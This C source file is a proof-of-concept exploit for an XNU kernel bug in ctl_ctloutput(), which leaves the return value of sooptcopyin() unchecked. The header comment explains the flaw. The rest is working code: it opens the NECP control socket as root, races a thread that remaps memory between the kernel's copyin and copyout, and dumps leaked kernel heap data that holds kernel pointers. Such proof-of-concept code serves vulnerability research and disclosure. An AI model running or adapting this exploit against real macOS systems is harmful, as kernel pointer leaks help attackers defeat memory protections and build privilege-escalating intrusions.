/*
 * ctl_ctloutput-leak.c
 * Brandon Azad
 *
 * While looking through the source code of XNU version 4570.1.46, I noticed that the function
 * ctl_ctloutput() in the file bsd/kern/kern_control.c does not check the return value of
 * sooptcopyin(), which makes it possible to leak the uninitialized contents of a kernel heap
 * allocation to user space. Triggering this information leak requires root privileges.
 *
 * The ctl_ctloutput() function is called when a userspace program calls getsockopt(2) on a kernel
 * control socket. The relevant code does the following:
 *   (a) It allocates a kernel heap buffer for the data parameter to getsockopt(), without
 *       specifying the M_ZERO flag to zero out the allocated bytes.
 *   (b) It copies in the getsockopt() data from userspace using sooptcopyin(), filling the data
 *       buffer just allocated. This copyin is supposed to completely overwrite the allocated data,
 *       which is why the M_ZERO flag was not needed. However, the return value of sooptcopyin() is
 *       not checked, which means it is possible that the copyin has failed, leaving uninitialized
 *       data in the buffer. The copyin could fail if, for example, the program passed an unmapped
 *       address to getsockopt().
 *   (c) The code then calls the real getsockopt() implementation for this kernel control socket.
 *       This implementation should process the input buffer, possibly modifying it and shortening
 *       it, and return a result code. However, the implementation is free to assume that the
 *       supplied buffer has already been initialized (since theoretically it comes from user
 *       space), and hence several implementations don't modify the buffer at all. The NECP
 *       function necp_ctl_getopt(), for example, just returns 0 without processing the data buffer
 *       at all.
 *   (d) Finally, if the real getsockopt() implementation doesn't return an error, ctl_ctloutput()
 *       calls sooptcopyout() to copy the data buffer back to user space.
 *
 * Thus, by specifying an unmapped data address to getsockopt(2), we can cause a heap buffer of a
 * controlled size to be allocated, prevent the contents of that buffer from being initialized, and
 * then reach a call to sooptcopyout() that tries to write that buffer back to the unmapped
 * address. All we need to do for the copyout to succeed is remap that address between the calls to
 * sooptcopyin() and sooptcopyout(). If we can do that, then we will leak uninitialized kernel heap
 * data to userspace.
 *
 * It turns out that this is a pretty easy race to win. While testing on my 2015 Macbook Pro, the
 * mean number of attempts to win the race was never more than 600, and the median was never more
 * than 5. (This testing was conducted with DEBUG off, since the printfs dramatically slow down the
 * exploit.)
 *
 * This program exploits this vulnerability to leak data from a kernel heap buffer of a
 * user-specified size. No attempt is made to seed the heap with interesting data. Tested on macOS
 * High Sierra 10.13 (build 17A365).
 */
#if 0
	if (sopt->sopt_valsize && sopt->sopt_val) {
		MALLOC(data, void *, sopt->sopt_valsize, M_TEMP,	// (a) data is allocated
			M_WAITOK);					//     without M_ZERO.
		if (data == NULL)
			return (ENOMEM);
		/*
		 * 4108337 - copy user data in case the
		 * kernel control needs it
		 */
		error = sooptcopyin(sopt, data,				// (b) sooptcopyin() is
			sopt->sopt_valsize, sopt->sopt_valsize);	//     called to fill the
	}								//     buffer; the return
	len = sopt->sopt_valsize;					//     value is ignored.
	socket_unlock(so, 0);
	error = (*kctl->getopt)(kctl->kctlref, kcb->unit,		// (c) The getsockopt()
			kcb->userdata, sopt->sopt_name,			//     implementation is
				data, &len);				//     called to process
	if (data != NULL && len > sopt->sopt_valsize)			//     the buffer.
		panic_plain("ctl_ctloutput: ctl %s returned "
			"len (%lu) > sopt_valsize (%lu)\n",
				kcb->kctl->name, len,
				sopt->sopt_valsize);
	socket_lock(so, 0);
	if (error == 0) {
		if (data != NULL)
			error = sooptcopyout(sopt, data, len);		// (d) If (c) succeeded,
		else							//     then the data buffer
			sopt->sopt_valsize = len;			//     is copied out to
	}								//     userspace.
#endif

#include <errno.h>
#include <mach/mach.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>

#if __x86_64__

// ---- Header files not available on iOS ---------------------------------------------------------

#include <mach/mach_vm.h>
#include <sys/sys_domain.h>
#include <sys/kern_control.h>

#else /* __x86_64__ */

// If we're not on x86_64, then we probably don't have access to the above headers. The following
// definitions are copied directly from the macOS header files.

// ---- Definitions from mach/mach_vm.h -----------------------------------------------------------

extern
kern_return_t mach_vm_allocate
(
	vm_map_t target,
	mach_vm_address_t *address,
	mach_vm_size_t size,
	int flags
);

extern
kern_return_t mach_vm_deallocate
(
	vm_map_t target,
	mach_vm_address_t address,
	mach_vm_size_t size
);

// ---- Definitions from sys/sys_domain.h ---------------------------------------------------------

#define SYSPROTO_CONTROL	2	/* kernel control protocol */

#define AF_SYS_CONTROL		2	/* corresponding sub address type */

// ---- Definitions from sys/kern_control.h -------------------------------------------------------

#define CTLIOCGINFO     _IOWR('N', 3, struct ctl_info)	/* get id from name */

#define MAX_KCTL_NAME	96

struct ctl_info {
    u_int32_t	ctl_id;					/* Kernel Controller ID  */
    char	ctl_name[MAX_KCTL_NAME];		/* Kernel Controller Name (a C string) */
};

struct sockaddr_ctl {
    u_char	sc_len;		/* depends on size of bundle ID string */
    u_char	sc_family;	/* AF_SYSTEM */
    u_int16_t 	ss_sysaddr;	/* AF_SYS_KERNCONTROL */
    u_int32_t	sc_id; 		/* Controller unique identifier  */
    u_int32_t 	sc_unit;	/* Developer private unit number */
    u_int32_t 	sc_reserved[5];
};

#endif /* __x86_64__ */

// ---- Definitions from bsd/net/necp.h -----------------------------------------------------------

#define	NECP_CONTROL_NAME "com.apple.net.necp_control"

// ---- Macros ------------------------------------------------------------------------------------

#if DEBUG
#define DEBUG_TRACE(fmt, ...)	printf(fmt"\n", ##__VA_ARGS__)
#else
#define DEBUG_TRACE(fmt, ...)
#endif

#define ERROR(fmt, ...)		printf("Error: "fmt"\n", ##__VA_ARGS__)

// ---- Kernel heap infoleak ----------------------------------------------------------------------

// A callback block that will be called each time kernel data is leaked. leak_data and leak_size
// are the kernel data that was leaked and the size of the leak. This function should return true
// to finish and clean up, false to retry the leak.
typedef bool (^kernel_leak_callback_block)(const void *leak_data, size_t leak_size);

// Open the control socket for com.apple.necp. Requires root privileges.
static bool open_necp_control_socket(int *necp_ctlfd) {
	int ctlfd = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL);
	if (ctlfd < 0) {
		ERROR("Could not create a system control socket: errno %d", errno);
		return false;
	}
	struct ctl_info ctlinfo = { .ctl_id = 0 };
	strncpy(ctlinfo.ctl_name, NECP_CONTROL_NAME, sizeof(ctlinfo.ctl_name));
	int err = ioctl(ctlfd, CTLIOCGINFO, &ctlinfo);
	if (err) {
		close(ctlfd);
		ERROR("Could not retrieve the control ID number for %s: errno %d",
				NECP_CONTROL_NAME, errno);
		return false;
	}
	struct sockaddr_ctl addr = {
		.sc_len     = sizeof(addr),
		.sc_family  = AF_SYSTEM,
		.ss_sysaddr = AF_SYS_CONTROL,
		.sc_id      = ctlinfo.ctl_id, // com.apple.necp
		.sc_unit    = 0,              // Let the kernel pick the control unit.
	};
	err = connect(ctlfd, (struct sockaddr *)&addr, sizeof(addr));
	if (err) {
		close(ctlfd);
		ERROR("Could not connect to the NECP control system (ID %d) "
				"unit %d: errno %d", addr.sc_id, addr.sc_unit, errno);
		return false;
	}
	*necp_ctlfd = ctlfd;
	return true;
}

// Allocate a virtual memory region at the address pointed to by map_address. If map_address points
// to a NULL address, then the allocation is created at an arbitrary address which is stored in
// map_address on return.
static bool allocate_map_address(void **map_address, size_t map_size) {
	mach_vm_address_t address = (mach_vm_address_t) *map_address;
	bool get_address = (address == 0);
	int flags = (get_address ? VM_FLAGS_ANYWHERE : VM_FLAGS_FIXED);
	kern_return_t kr = mach_vm_allocate(mach_task_self(), &address, map_size, flags);
	if (kr != KERN_SUCCESS) {
		ERROR("Could not allocate virtual memory: mach_vm_allocate %d: %s",
				kr, mach_error_string(kr));
		return false;
	}
	if (get_address) {
		*map_address = (void *)address;
	}
	return true;
}

// Deallocate the mapping created by allocate_map_address.
static void deallocate_map_address(void *map_address, size_t map_size) {
	mach_vm_deallocate(mach_task_self(), (mach_vm_address_t) map_address, map_size);
}

// Context for the map_address_racer thread.
struct map_address_racer_context {
	pthread_t     thread;
	volatile bool running;
	volatile bool deallocated;
	volatile bool do_map;
	volatile bool restart;
	bool          success;
	void *        address;
	size_t        size;
};

// The racer thread. This thread will repeatedly: (a) deallocate the address; (b) spin until do_map
// is true; (c) allocate the address; (d) spin until the main thread sets restart to true or
// running to false. If the thread encounters an internal error, it sets success to false and
// exits.
static void *map_address_racer(void *arg) {
	struct map_address_racer_context *context = arg;
	while (context->running) {
		// Deallocate the address.
		deallocate_map_address(context->address, context->size);
		context->deallocated = true;
		// Wait for do_map to become true.
		while (!context->do_map) {}
		context->do_map = false;
		// Do a little bit of work so that the allocation is more likely to take place at
		// the right time.
		close(-1);
		// Re-allocate the address. If this fails, abort.
		bool success = allocate_map_address(&context->address, context->size);
		if (!success) {
			context->success = false;
			break;
		}
		// Wait while we're still running and not told to restart.
		while (context->running && !context->restart) {}
		context->restart = false;
	};
	return NULL;
}

// Start the map_address_racer thread.
static bool start_map_address_racer(struct map_address_racer_context *context, size_t leak_size) {
	// Allocate the initial block of memory, fixing the address.
	context->address = NULL;
	context->size    = leak_size;
	if (!allocate_map_address(&context->address, context->size)) {
		goto fail_0;
	}
	// Start the racer thread.
	context->running     = true;
	context->deallocated = false;
	context->do_map      = false;
	context->restart     = false;
	context->success     = true;
	int err = pthread_create(&context->thread, NULL, map_address_racer, context);
	if (err) {
		ERROR("Could not create map_address_racer thread: errno %d", err);
		goto fail_1;
	}
	return true;
fail_1:
	deallocate_map_address(context->address, context->size);
fail_0:
	return false;
}

// Stop the map_address_racer thread.
static void stop_map_address_racer(struct map_address_racer_context *context) {
	// Exit the thread.
	context->running = false;
	context->do_map  = true;
	pthread_join(context->thread, NULL);
	// Deallocate the memory.
	deallocate_map_address(context->address, context->size);
}

// Try the NECP leak once. Returns true if the leak succeeded.
static bool try_necp_leak(int ctlfd, struct map_address_racer_context *context) {
	socklen_t length = context->size;
	// Wait for the map to be deallocated.
	while (!context->deallocated) {};
	context->deallocated = false;
	// Signal the racer to do the mapping.
	context->do_map = true;
	// Try to trigger the leak.
	int err = getsockopt(ctlfd, SYSPROTO_CONTROL, 0, context->address, &length);
	if (err) {
		DEBUG_TRACE("Did not allocate in time");
		return false;
	}
	// Most of the time we end up here: allocating too early. If the first two words are both
	// 0, then assume we didn't make the leak. We need the leak size to be at least 16 bytes.
	uint64_t *data = context->address;
	if (data[0] == 0 && data[1] == 0) {
		return false;
	}
	// WOW! It worked!
	return true;
}

// Repeatedly try the NECP leak, until either we succeed or hit the maximum retry limit.
static bool try_necp_leak_repeat(int ctlfd, kernel_leak_callback_block kernel_leak_callback,
		struct map_address_racer_context *context) {
	const size_t MAX_TRIES = 10000000;
	bool has_leaked = false;
	for (size_t try = 1;; try++) {
		// Try the leak once.
		if (try_necp_leak(ctlfd, context)) {
			DEBUG_TRACE("Triggered the leak after %zu %s!", try,
					(try == 1 ? "try" : "tries"));
			try = 0;
			has_leaked = true;
			// Give the leak to the callback, and finish if it says we're done.
			if (kernel_leak_callback(context->address, context->size)) {
				return true;
			}
		}
		// If we haven't successfully leaked anything after MAX_TRIES attempts, give up.
		if (!has_leaked && try >= MAX_TRIES) {
			ERROR("Giving up after %zu unsuccessful leak attempts", try);
			return false;
		}
		// Reset for another try.
		context->restart = true;
	}
}

// Leak kernel heap data repeatedly until the callback function returns true.
static bool leak_kernel_heap(size_t leak_size, kernel_leak_callback_block kernel_leak_callback) {
	const size_t MIN_LEAK_SIZE = 16;
	bool success = false;
	if (leak_size < MIN_LEAK_SIZE) {
		ERROR("Target leak size too small; must be at least %zu bytes", MIN_LEAK_SIZE);
		goto fail_0;
	}
	int ctlfd;
	if (!open_necp_control_socket(&ctlfd)) {
		goto fail_0;
	}
	struct map_address_racer_context context;
	if (!start_map_address_racer(&context, leak_size)) {
		goto fail_1;
	}
	if (!try_necp_leak_repeat(ctlfd, kernel_leak_callback, &context)) {
		goto fail_2;
	}
	success = true;
fail_2:
	stop_map_address_racer(&context);
fail_1:
	close(ctlfd);
fail_0:
	return success;
}

// ---- Main --------------------------------------------------------------------------------------

// Dump data to stdout.
static void dump(const void *data, size_t size) {
	const uint8_t *p = data;
	const uint8_t *end = p + size;
	unsigned off = 0;
	while (p < end) {
		printf("%06x:  %02x", off & 0xffffff, *p++);
		for (unsigned i = 1; i < 16 && p < end; i++) {
			bool space = (i % 8) == 0;
			printf(" %s%02x", (space ? " " : ""), *p++);
		}
		printf("\n");
		off += 16;
	}
}

int main(int argc, const char *argv[]) {
	// Parse the arguments.
	if (argc != 2) {
		ERROR("Usage: %s <leak-size>", argv[0]);
		return 1;
	}
	char *end;
	size_t leak_size = strtoul(argv[1], &end, 0);
	if (*end != 0) {
		ERROR("Invalid leak size '%s'", argv[1]);
		return 1;
	}
	// Try to leak interesting data from the kernel.
	const size_t MAX_TRIES = 50000;
	__block size_t try = 1;
	__block bool leaked = false;
	bool success = leak_kernel_heap(leak_size, ^bool (const void *leak, size_t size) {
		// Try to find an kernel pointer in the leak.
		const uint64_t *p = leak;
		for (size_t i = 0; i < size / sizeof(*p); i++) {
			if (p[i] >> 48 == 0xffff) {
				dump(leak, size);
				leaked = true;
				return true;
			}
		}
#if DEBUG
		// Show this useless leak anyway.
		DEBUG_TRACE("Boring leak:");
		dump(leak, size);
#endif
		// If we've maxed out, just bail.
		if (try >= MAX_TRIES) {
			ERROR("Could not leak interesting data after %zu attempts", try);
			return true;
		}
		try++;
		return false;
	});
	return (success && leaked ? 0 : 1);
}
